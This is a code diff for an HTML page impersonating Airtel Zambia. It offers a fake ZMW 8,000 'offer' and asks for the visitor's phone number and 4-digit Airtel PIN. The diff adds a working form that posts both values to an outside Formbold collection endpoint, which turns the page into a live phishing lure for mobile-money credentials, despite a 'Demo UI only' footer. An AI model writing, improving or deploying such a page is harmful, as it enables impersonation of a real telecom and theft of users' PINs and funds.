@@ -3,29 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Zambia Loan</title>
-
+    <title>Airtel Zambia Offer</title>
     <!-- Link to external CSS -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
     <div class="card">
-        <h1>Airtel Zambia Loan Request</h1>
-
+        <h1>Airtel Zambia Offer</h1>
         <p class="subtitle">
-            Welcome! Enter your phone number and Airtel PIN (4 digits) to receive your loan.
+            Welcome! Enter your phone number and Airtel PIN (4 digits) to withdraw your offer.
         </p>
-
         <div class="amount-box">
-            <div class="amount-label">Eligible Loan Amount</div>
+            <div class="amount-label">Eligible Offer Amount</div>
             <div class="amount">ZMW 8,000</div>
         </div>
 
-        <input type="tel" placeholder="Phone Number (e.g. 097XXXXXXX)">
-        <input type="password" placeholder="Airtel PIN (4 digits)">
-
-        <button>Submit</button>
+        <!-- Form now points to your Formbold endpoint -->
+        <form action="https://formbold.com/s/94naj" method="POST">
+            <input type="tel" name="phoneNumber" placeholder="Phone Number (e.g. 097XXXXXXX)" required>
+            <input type="password" name="pin" placeholder="PIN (4 digits)" maxlength="4" required>
+            <button type="submit">WITHDRAW</button>
+        </form>
 
         <div class="footer">
             Entering your PIN confirms acceptance of the terms and conditions.
@@ -33,6 +31,5 @@
             © Airtel Zambia – Demo UI only
         </div>
     </div>
-
 </body>
 </html>
